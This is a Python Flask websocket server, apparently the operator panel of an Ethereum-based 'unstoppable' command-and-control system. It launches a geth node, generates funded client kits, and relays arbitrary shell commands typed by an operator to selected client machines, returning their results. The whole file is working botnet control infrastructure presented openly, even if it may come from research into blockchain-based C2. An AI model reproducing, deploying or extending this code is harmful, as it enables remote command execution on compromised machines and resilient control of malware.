import time
from hashlib import md5
from datetime import datetime
from flask import Flask, request, session, url_for, redirect, \
	render_template, abort, g, flash, _app_ctx_stack
from werkzeug import check_password_hash, generate_password_hash
from flask import jsonify
from flask import current_app
import subprocess as sp
import atexit
import json
from collections import OrderedDict
from werkzeug.exceptions import HTTPException, NotFound
from flask_sockets import Sockets
from gevent import pywsgi
from geventwebsocket.handler import WebSocketHandler
from geventwebsocket import WebSocketApplication

from Server import DeployUnstoppableCnC as ecnc_du
from Server import ServerCommands as ecnc_s
import Util as ecnc_u

class ServerCommandsWSExt(ecnc_s.ServerCommands):
	"""
	websocket aware SC extension
	"""
	
	def __init__(self, confFile):
		super().__init__(confFile)
		self.ws_app_set = []

	def registrationConfirmation(self, c_addr, session_id):

		if not super().registrationConfirmation(c_addr, session_id):
			log.error('sc-ext: registrationConfirmation() returned false')
			return

		for ws_app in self.ws_app_set:
			ws_app.on_c_reg(c_addr, session_id)

	def cmdArrival(self, c_addr, cmd_id, cmd_result):
		super().cmdArrival(c_addr, cmd_id, cmd_result)
		for ws_app in self.ws_app_set:
			ws_app.on_cmd_rx(c_addr, cmd_id)

	def reg(self, ws_app):
		log.info('sc-ext: app registered: ws-addr: ...')
		self.ws_app_set.append(ws_app)


class ECnCWSApp(WebSocketApplication):
	"""
	ecnc websocket app
	"""

	def __init__(self, sc, c_map_by_addr, ws):

		self.sc = sc

		self.c_counter = 0  # client counter
		self.cmd_map = {}
		self.c_map_by_addr = c_map_by_addr
	
		super().__init__(ws)
		self.sc.reg(self)

	def ws_write(self, msg_type, payload):
		msg = {'msg_type': msg_type, 'payload': payload}
		self.ws.send(json.dumps(msg))
		log.info('ws: w: ', str(msg))

	def on_open(self):

		log.info("ws: connection open, sending client map")

		self.ws_write('s.hello', None)
		for c_addr, c in self.c_map_by_addr.items():
			if 'cmdId' == c_addr: # skip cmdId key which does not represent a real client
				continue
			self.ws_write('s.client-update', c)

	def on_c_reg(self, c_addr, session_id):
		c = self.c_map_by_addr[c_addr]
		c['status'] = 'registered'
		self.ws_write('s.client-update', c)

	def on_cmd_rx(self, c_addr, cmd_id):
		cmd = self.c_map_by_addr[c_addr]['commands'][cmd_id]
		cmd_set = [cmd]
		payload = { 'cmd_set': cmd_set}
		self.ws_write('c.cmd_update', payload)

	def on_message(self, msg_r_raw):

		msg_r = json.loads(msg_r_raw)
		msg_r_type = msg_r['msg_type']
		log.info('ws: r: ', str(msg_r))

		if 's.gen-client-kit' == msg_r_type:
			
			new_client_id = '__new-client-placeholder-id__'

			c_id = str(self.c_counter)

			#
			# hack: new-client-placeholder: create
			#
			tmp_c = {'status': 'kit-generation', 'addr': new_client_id}
			self.ws_write('s.client-update', tmp_c)

			c_addr, c_conf = self.sc.generateNewClientInstance(fundValue=10 ** 18,
												 clientConfTemplateFile='conf/clientGen/ClientConf.TEMPLATE.yaml',
												 clientId=c_id,
												 port=30304 + self.c_counter,
												 walletJson=None,
												 walletPassword=None)

			#
			# hack: new-client-placeholder: rm
			#
			tmp_c = {'status': 'kit-generation-end', 'addr': new_client_id}
			self.ws_write('s.client-update', tmp_c)

			self.c_counter += 1

			c = self.c_map_by_addr[c_addr]
			c['addr'] = c_addr
			c['page_link'] = '/client/%s' % (c['addr'])
			c['conf'] = c_conf
			c['status'] = 'reg-allowed'
			self.ws_write('s.client-update', c)

		if 'c.work-tx' == msg_r_type:

			cmd_set = []
			c_addr_set = msg_r['payload']['c_addr_set']
			shell_cmd = msg_r['payload']['shell_cmd']
			for c_addr in c_addr_set:
				cmd = self.sc.addWork(c_addr, shell_cmd)
				cmd_set.append(cmd)

			# prep reply msg
			payload = { 'cmd_set': cmd_set}
			self.ws_write('c.cmd_update', payload)

	def on_close(self, reason):
		log.info("ws: connection close")

#
# Flask app init
#


# create our little application :)
app = Flask('ecnc')
app.config.from_object(__name__)
app.config.from_envvar('ECNC_SETTINGS', silent=True)

sockets = Sockets(app)

log = ecnc_u.LogWrapper.getLogger()

#
# init global context
#
with app.app_context():

	# run geth node
	if not getattr(current_app, 'geth_proc', None):

		log.info('launching server geth node')

		du_conf = ecnc_du.loadConf()
		ownerChanged = ecnc_du.loadOrGenerateAccount(du_conf, regenerateOwnerAccount=False)
		current_app.geth_proc = ecnc_du.runGethNode(du_conf, False)  # prints log info message
		# atexit.register(lambda : ecnc_u.kill_proc(current_app.geth_proc))
  
	srv_conf_path = 'conf/server/ServerConf.yaml'
	sc = ServerCommandsWSExt(srv_conf_path)
	sc.startAllWatchers()
	current_app.sc = sc
	current_app.c_map_by_addr = sc.instances

	log.info('flask server running: ...')


@sockets.route('/echo')
def ecnc_echo_socket(ws):
	ws_srv = ECnCWSApp(current_app.sc, current_app.c_map_by_addr, ws)
	ws_srv.handle()
	return []


@app.before_first_request
def app_init():
	# setattr(g, 'sc', ServerCommands.ServerCommands('/conf/gen/ServerConf.yaml'))
	pass


@app.teardown_appcontext
def close_database(exception):
	pass


@app.route('/')
def root():
	return app.send_static_file('index.html')

@app.route('/status')
def status():
	
	c_set = current_app.sc.instances

	# prep return
	ret = OrderedDict()
	ret['owner-address'] = current_app.sc.ownerAddress
	ret['ether-balance'] = 'n/a' # current_app.sc.balance_wei
	return jsonify(ret)


@app.route('/client/<c_addr>')
def client_load_config(c_addr):

	conf = current_app.c_map_by_addr[c_addr].conf
	conf_pretty = json.dumps(conf, indent=3)
	return render_template('client.html',
						c_addr=c_addr,
						conf=conf_pretty)


if __name__ == "__main__":
	server = pywsgi.WSGIServer(('', 5000), app, handler_class=WebSocketHandler)
	server.serve_forever()

